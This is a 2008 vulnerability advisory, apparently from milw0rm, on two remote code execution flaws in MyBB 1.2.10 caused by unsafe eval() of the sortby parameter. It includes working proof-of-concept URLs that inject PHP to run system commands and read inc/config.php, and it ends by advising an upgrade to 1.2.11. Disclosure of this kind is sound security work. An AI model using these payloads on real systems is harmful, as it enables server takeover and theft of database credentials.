@@ -1,0 +1,109 @@
+[waraxe-2008-SA#061] - Remote Code Execution in MyBB 1.2.10
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Independent discovery: koziolek
+Date: 16. January 2008
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-61.html
+
+
+Target software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+MyBB is a discussion board that has been around for a while; it has evolved
+from other bulletin boards into the forum package it is today. Therefore,
+it is a professional and efficient discussion board, developed by an active
+team of developers.
+
+Vulnerabilities discovered
+===============================================================================
+
+1. Remote Code Execution in "forumdisplay.php":
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Precondition: valid forum "fid" must be known.
+Attacker doesn't need to have any privileges in mybb installation to be
+successful in attack.
+
+Proof-Of-Concept request:
+
+http://localhost/mybb.1.2.10/forumdisplay.php?fid=2&sortby='
+
+... and we will see error message:
+
+Parse error: syntax error, unexpected ''', expecting ']' in
+C:\apache_wwwroot\mybb.1.2.10\forumdisplay.php(407) : eval()'d code on line 1
+
+Problematic piece of code is related to "eval()" function:
+
+eval("\$orderarrow['$sortby'] = \"".
+$templates->get("forumdisplay_orderarrow")."\";");
+
+
+Example attacks:
+
+http://localhost/mybb.1.2.10/forumdisplay.php?fid=2
+&sortby='];phpinfo();exit;//
+http://localhost/mybb.1.2.10/forumdisplay.php?fid=2
+&sortby='];system('ls');exit;//
+http://localhost/mybb.1.2.10/forumdisplay.php?fid=2
+&sortby='];readfile('inc/config.php');exit;//
+
+
+2. Remote Code Execution in "search.php":
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Precondition: search "sid" must be known - but that's trivial task.
+Attacker doesn't need to have any privileges in mybb installation to be
+successful in attack.
+
+http://localhost/mybb.1.2.10/search.php?action=results&sid=[valid sid here]
+&sortby='
+
+Parse error: syntax error, unexpected ''', expecting ']' in
+C:\apache_wwwroot\mybb.1.2.10\search.php(141) : eval()'d code on line 1
+
+Problematic is exactly same piece of code, as in previous case:
+
+eval("\$orderarrow['$sortby'] = \"".
+$templates->get("forumdisplay_orderarrow")."\";");
+
+Example attacks:
+
+http://localhost/mybb.1.2.10/search.php?action=results&sid=[valid sid here]
+&sortby='];phpinfo();exit;//
+http://localhost/mybb.1.2.10/search.php?action=results&sid=[valid sid here]
+&sortby='];system('ls');exit;//
+http://localhost/mybb.1.2.10/search.php?action=results&sid=[valid sid here]
+&sortby='];readfile('inc/config.php');exit;//
+
+Both remote code execution security holes are very dangerous and can be
+used by attacker to complete takeover the website and possible total
+compromise of webserver.
+
+How to fix:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Download MyBB new version 1.2.11 as soon as possible!
+
+
+Greetings:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Greets to ToXiC, LINUX, y3dips, Sm0ke, Heintz, slimjim100, Chb
+and anyone else who know me!
+Greetings to Raido Kerna. Tervitusi Torufoorumi rahvale!
+
+Contact:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+come2waraxe@yahoo.com
+Janek Vind "waraxe"
+
+Homepage: http://www.janekvind.com/
+Waraxe forum:  http://www.waraxe.us/forums.html
+
+---------------------------------- [ EOF ] ------------------------------------
+
+# milw0rm.com [2008-01-16]
